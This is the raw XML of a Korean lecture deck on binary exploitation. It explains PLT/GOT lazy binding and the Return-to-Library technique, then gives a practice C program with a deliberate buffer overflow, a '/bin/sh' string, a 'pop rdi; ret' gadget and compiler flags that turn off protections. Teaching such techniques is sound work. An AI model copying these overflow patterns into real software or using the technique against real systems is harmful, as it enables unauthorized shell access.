          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9057631" y="2981057"/>
            <a:ext cx="261689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동적 컴파일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파일 크기 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>메모리 정보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FD441E-0EF3-64D8-AA3D-04483ACAEF76}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4284620" y="2696795"/>
            <a:ext cx="3431177" cy="1519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#include &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>stdio.h</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&gt;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int main() {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        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("compile");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        return 0;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}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3910E91-AD8F-EE16-611B-0BF9C1EA5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74" y="3977751"/>
            <a:ext cx="3431177" cy="48169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E7D45E-F005-970F-07D2-54ECE6FF7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954" y="3783494"/>
            <a:ext cx="3606572" cy="38851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CD6A68C-B849-8A47-DA84-1599A6209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56" y="4678427"/>
            <a:ext cx="4326709" cy="120669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3B0C9BB-B413-E7FB-4459-A99580081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829" y="4347022"/>
            <a:ext cx="4958715" cy="2220492"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="19" name="그래픽 18" descr="오른쪽 화살표 단색으로 채워진">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0BE885B4-949C-9A6A-CAD7-1F6614139B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6621" y="2955893"/>
            <a:ext cx="576943" cy="576943"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="20" name="그래픽 19" descr="오른쪽 화살표 단색으로 채워진">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DC16F186-06D7-30DB-5591-DAB1025343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3567265" y="2955893"/>
            <a:ext cx="576943" cy="57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95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8E62-B868-7FEC-454A-970D54CD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756DB1-5132-A928-874C-71AB62D09C5C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1504C-D360-B7FC-207A-3FC031CAAA2F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EDDFD-6BC7-6437-779E-071A1E370FBF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D608F-A0E5-7FC6-8E34-C22BCC3400DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1283118"/>
            <a:ext cx="1166803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현재 대부분의 프로그램은 동적 컴파일을 사용합니다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동적 컴파일 시 소스 코드 내 존재하는 외부 함수</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(ex: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printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400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는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.PLT(Procedure Linkage Table)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섹션에 적히고 해당 함수 호출 시 프로그램은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PLT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섹션을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간접 호출</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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그 후</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, .GOT(Global Offset Table)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섹션에 적힌 외부 라이브러리의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실제 주소를 호출</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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7442642-41EE-F5B1-4C8E-18F959982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74" y="4068667"/>
            <a:ext cx="6615249" cy="193871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2478D0E-53D1-D662-39C9-4FA606EE9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74" y="2535716"/>
            <a:ext cx="6581775" cy="12858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C7F9DC9-69F9-8EA4-5F78-C0B4DE0F17CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7256377" y="3024764"/>
            <a:ext cx="40821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소스 코드의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printf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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PLT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>적힌 것 확인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B29711-836A-AD0C-AAB6-079B2384B220}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7256376" y="4884134"/>
            <a:ext cx="2802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printf@plt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간접 호출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F9E33-FFC5-A4A7-460A-8F9D289F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F5483AB-D5BC-868E-4790-5881BB0BC8EB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4E31C-6716-3C73-3B65-2E7204CF4A9E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0B7C8F-46FD-FEFD-9CA6-4B3C23317157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BC335B-5CA1-2811-CDC9-E25902CAE8B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1351058"/>
            <a:ext cx="116680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만약 프로그램 런타임 중 외부 함수가 첫 호출일 때는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GOT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>영역에 라이브러리의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함수의 실제 주소를 적는 과정을 거칩니다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jmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> qword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ptr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> [rip + 0x2fca] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에서 만약 두번째 호출일때는 외부 라이브러리 함수 주소로 바로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jmp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9B4D2D-10B3-F3B0-DA57-A3E145A30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1" y="2281236"/>
            <a:ext cx="4879930" cy="5762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6A5B3C8-C426-576E-B36A-6D62DFA01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139010" cy="104045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F8FFC74-D12A-CD34-8E3D-3D7E982A6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81235"/>
            <a:ext cx="5139009" cy="57620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6C30F8B-E175-CCF0-80D7-F43CF9A89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52" y="3206686"/>
            <a:ext cx="4879929" cy="124955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31D17C5-F0A9-DD55-4BB5-F5F64BAD03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551" y="4982353"/>
            <a:ext cx="4879930" cy="123902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B7C0454-3BB9-4310-A7B9-3C9889CCDB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982353"/>
            <a:ext cx="5139009" cy="995824"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="26" name="그래픽 25" descr="오른쪽 화살표 단색으로 채워진">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2563FBED-4DEE-DE46-035F-12283CDF5D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08897" y="2340739"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="27" name="그래픽 26" descr="오른쪽 화살표 단색으로 채워진">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B6B7E9ED-A099-6818-5B7E-8D6145EDEF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8436904" y="2914622"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="28" name="그래픽 27" descr="오른쪽 화살표 단색으로 채워진">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{55A73F83-FC38-2BD1-6A70-8F66A1244C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5508897" y="3720628"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="29" name="그래픽 28" descr="오른쪽 화살표 단색으로 채워진">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{31D4207B-DCA7-B580-5DCE-5E8EA37BBC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2695916" y="4501263"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="30" name="그래픽 29" descr="오른쪽 화살표 단색으로 채워진">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{84C365A5-A640-7C85-D5E1-93C210AA01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01640" y="5278342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1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4EC8B-6301-F4CD-51D1-5D6335800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867AAA6-7AD7-4497-027C-40B677A3AEFB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EF180-6806-C9FB-B40D-7FDB3716B036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4F504-3363-4764-F7E3-8416DEC943C3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FB8133-20D9-8F58-6677-5B113732E37D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1351058"/>
            <a:ext cx="116680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결과적으로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소스 코드 내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외부 함수</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>가 있다면 동적 컴파일 과정에서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PLT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에 등록</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>되고 호출 시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PLT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간접 호출 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>통해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GOT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에 적힌 실제 라이브러리 함수를 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>호출합니다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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, RET </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>를 원하는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함수의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PLT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>로 변조</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>시키면 해당 함수 호출이 가능합니다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DA075DC-8A99-FB43-00CD-4C8BBF119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36" y="2302264"/>
            <a:ext cx="3933825" cy="14287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DB6DB23-7694-E101-535E-7741B8A02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153" y="2433023"/>
            <a:ext cx="4874728" cy="1084859"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="그래픽 13" descr="오른쪽 화살표 단색으로 채워진">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EC3B9F09-096C-A510-D44D-CC725FF04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7809" y="2514600"/>
            <a:ext cx="914400" cy="9144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51AD6F8-CDBD-BD2B-DCB5-9E84FEEFBD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153" b="21143"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5749153" y="3882547"/>
            <a:ext cx="3035430" cy="26565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788915A-F5F4-0BA6-17ED-ADFA03CECEB9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4398761" y="4994267"/>
            <a:ext cx="873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RTL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>과정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63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1ECE-54E8-4FDB-F278-04E2A581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C77A2E5-0F48-3EC6-442D-8C6ADA35843B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2BEE2A-FA6F-3576-921E-545DF78C6D58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AB6AC-6E7B-9161-2538-AD3F4373A0C1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EAC99C-3A14-BD18-80F4-893C51D728CA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1351058"/>
            <a:ext cx="1166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예제를 통해 실습해보겠습니다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D35BCC-A1CE-F953-4509-8792BAD8241E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="225410" y="1802675"/>
            <a:ext cx="5227382" cy="4712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tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>gcc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rtl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rtl.c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -z </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>noexecstack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fstcak</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>-protector -no-pie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#include &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>stdio.h</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100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#include &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>unistd.h</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&gt;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#include &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>stdlib.h</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&gt;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const char* </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>binsh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = "/bin/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>";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void gadget() {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    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>asm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("pop %</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rdi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>; ret");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}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int main() {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        char buffer[0x40];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        system("echo 'Return to Library'");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        read(0, buffer, 0x80);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    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("%s", buffer);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        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fflush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en-US" altLang="ko-KR" sz="1100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>stdout</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>);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        read(0, buffer, 0x80);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>        return 0;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="11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B870E-2665-28C6-C7DA-D7A15247033A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="2027663"/>
            <a:ext cx="2820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CF4EB-47A7-AF1F-3FF4-0F40DDE27FC6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5452792" y="1802675"/>
            <a:ext cx="642671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NX </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>보호기법 활성화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스택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카나리</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 활성화</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, pie </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>비활성화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pie </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>비활성화 한 이유는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system@plt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와 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“/bin/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</a:rPr>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>문자열이 프로그램 영역에 있으므로 해당 주소를 바로 얻기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위함입니다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(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>만약 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pie </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>활성화 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pie_base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값 구해야 함</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="12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system, read,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printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> ,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fflush</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 함수가 소스 코드 내에 존재하므로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PLT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섹션에 등록되어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또한</a:t>
